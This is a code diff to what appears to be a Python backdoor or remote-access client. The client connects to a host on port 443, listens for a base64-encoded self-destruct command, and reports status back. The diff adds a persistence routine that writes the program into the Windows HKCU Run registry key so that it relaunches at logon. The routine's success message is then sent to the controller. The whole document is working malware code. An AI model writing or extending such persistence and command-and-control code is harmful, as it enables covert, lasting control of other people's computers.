@@ -4,6 +4,21 @@ import os
 import base64
 import time
 import sys
+import _winreg
+from _winreg import HKEY_CURRENT_USER as HKCU
+
+
+def basic_persistence():
+    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
+    bin_path = sys.executable
+
+    try:
+        reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_WRITE)
+        _winreg.SetValueEx(reg_key, 'br', 0, _winreg.REG_SZ, bin_path)
+        _winreg.CloseKey(reg_key)
+        return True, 'HKCU Run registry key applied'
+    except WindowsError:
+        return False, 'HKCU Run registry key failed'
 
 
 def destruct():
@@ -18,7 +33,7 @@ def lets_talk():
     while data is None:
         try:
             client.connect((host, port))
-            client.send("ok")
+            client.send(p_message)
 
             if data == base64.b64encode('destruct'):
                 destruct()
@@ -42,6 +57,7 @@ def lets_talk():
 
 
 if __name__ == "__main__":
+    p_status, p_message = basic_persistence()
     self_path = os.path.abspath(__file__)
     host = socket.gethostname()
     port = 443
